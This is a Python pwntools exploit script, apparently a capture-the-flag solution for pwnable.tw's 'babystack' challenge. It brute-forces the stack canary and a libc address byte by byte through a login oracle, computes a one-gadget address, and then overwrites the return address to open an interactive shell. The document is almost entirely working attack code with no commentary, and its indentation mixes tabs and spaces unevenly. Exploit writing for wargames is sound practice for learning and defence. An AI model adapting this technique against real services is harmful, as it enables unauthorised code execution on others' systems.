from pwn import *

s=process('./babystack')

s=remote('chall.pwnable.tw',10205)
e=ELF('./babystack')
l=ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level='info'

canary=''
libc_leak=''

def password():
	global canary
	
	for i in range(0,16):
		print "COUNT : "+str(i)
		for j in range(0x1,0xff+1):
			s.recvuntil(">> ")
			s.sendline('1')
			s.recvuntil("Your passowrd :")
	      		s.sendline(canary+chr(j))
        		recv_=s.recv(6)
	
    			if recv_.find('Login') != -1:
             			canary+=chr((j))
               			print "canary: "+canary
				s.recvuntil(">> ")
				s.sendline('1')
				break
	
			else:	
				continue

def libc_bf(ini_value):
	global libc_leak
	
	libc_leak=ini_value

	for i in range(0,8):
		print "COUNT : "+str(i)
		for j in range(0x1,0xff+1):
			s.recvuntil(">> ")
			s.sendline('1')
			s.recvuntil("Your passowrd :")
      			s.sendline(libc_leak+chr(j))
        		recv_=s.recv(6)
    			if recv_.find('Login') != -1:
             			libc_leak+=chr((j))
               			print "libc_leak: "+libc_leak
				s.recvuntil(">> ")
				s.sendline('1')
				break
	
			else:	
				continue
	libc_leak+='\x00'*2
	libc_leak=u64(libc_leak[8:16])
	print "libc_leak: "+str(hex(libc_leak))

if __name__ == '__main__':

	libc_offset=0x78439
	global libc_leak
	
	print "[*]*********ATTACK***********[*]"
	password()
	s.recvuntil(">> ")
	s.sendline('1')
	s.recvuntil('Your passowrd :')
	s.send('\x00'+'A'*63+'B'*8)
	s.recvuntil('>> ')
	s.sendline('3')
	s.recvuntil('Copy :')
	s.sendline('A'*0x3f)

	s.recvuntil(">> ")
	s.sendline('1')

	libc_bf('B'*8)

	libc_base=libc_leak-libc_offset
	oneshot=libc_base+0xf0567

	print "libc base: "+str(hex(libc_base))
	print "oneshot: "+str(hex(oneshot))

	s.recvuntil('>> ')
	s.sendline('1')
	s.recvuntil('Your passowrd :')
	s.send('\x00'+'A'*63+canary+'B'*24+p64(oneshot))

	s.recvuntil('>> ')
	s.sendline('3')
	s.recvuntil('Copy :')
	s.sendline('R'*0x3f)	
	s.recvuntil('>> ')
	s.sendline('2')
	s.interactive()


